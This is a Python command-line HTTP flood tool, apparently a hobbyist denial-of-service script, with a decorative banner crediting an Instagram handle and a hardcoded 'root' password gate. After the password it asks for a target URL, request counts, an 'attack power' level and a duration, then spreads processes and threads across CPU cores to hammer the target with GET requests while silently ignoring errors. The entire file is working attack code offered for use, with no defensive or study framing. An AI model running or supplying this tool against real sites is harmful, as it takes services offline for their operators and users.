
import threading
import time
import multiprocessing
import requests
from colorama import Fore, Style
import os
import sys

# Display the junai banner with animation
def display_banner():
    banner_text = "JUNAI iNsTaGrAm @pqqqf "

    os.system("cls" if os.name == "nt" else "clear")  # Clear terminal
    for char in banner_text:
        sys.stdout.write(Fore.GREEN + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(0.1)  # Display each character with delay
    print("\n")

def password_prompt():
    password = input("Enter password: ")
    if password == "root":
        print(Fore.GREEN + "Correct password! Opening attack menu 0x7F6AD9F14371C6FB9678CA77..." + Style.RESET_ALL)
        start_attack()  # Attack menu
    else:
        print(Fore.RED + "Wrong password! Exiting..." + Style.RESET_ALL)
        exit(0)

# Speed up attack with more threads on a single core
def send_requests_threaded(target, request_count, thread_count):
    def send_request_thread():
        for _ in range(request_count):  # Each thread will make the specified number of requests
            try:
                response = requests.get(target)
                # You can uncomment the next line to see status codes
                # print(f"Status Code: {response.status_code}")
            except requests.exceptions.RequestException:
                pass  # Ignore all exceptions silently

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request_thread)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def show_attack_animation():
    animation_text = "Starting attack... "
    for _ in range(5):  # 5 seconds animation
        for char in animation_text:
            sys.stdout.write(Fore.YELLOW + char + Style.RESET_ALL)
            sys.stdout.flush()
            time.sleep(0.2)  # Display each character with delay
        sys.stdout.write('\r')  # Erase the line
        sys.stdout.flush()
        time.sleep(0.5)  # Wait a bit

def start_attack():
    try:
        target = input("Target URL: ")
        request_count = int(input("Number of Requests to Send: "))
        attack_power = int(input("Attack Power (1-2-3): "))
        thread_count = int(input("Number of Threads per Core: "))
        attack_duration = int(input("Attack Duration (seconds): "))

        if attack_power not in [1, 2, 3]:
            print("Invalid attack power selection. Defaulting to 2.")
            attack_power = 2

        total_cores = multiprocessing.cpu_count()
        if attack_power == 1:
            cores_to_use = max(1, total_cores // 4)
        elif attack_power == 2:
            cores_to_use = max(1, total_cores // 2)
        else:
            cores_to_use = total_cores

        # Increase the number of threads according to attack power
        thread_count = thread_count * attack_power

        print(f"Sending {request_count} requests to {target} using {cores_to_use} cores and {thread_count} threads per core...")

        # Show attack animation
        show_attack_animation()

        start_time = time.time()
        processes = []

        while time.time() - start_time < attack_duration:  # Continue for the duration of the attack
            for i in range(cores_to_use):
                process = multiprocessing.Process(target=send_requests_threaded, args=(target, request_count, thread_count))
                processes.append(process)
                process.start()

            for process in processes:
                process.join()

        end_time = time.time()
        duration = end_time - start_time

        print(f"Attack completed. Total duration: {duration:.2f} seconds.")
    except Exception:
        pass  # Ignore all exceptions silently

def main():
    try:
        display_banner()  # Display banner text
        password_prompt()  # Show password prompt
    except Exception:
        pass  # Ignore all exceptions silently

if __name__ == "__main__":
    main()
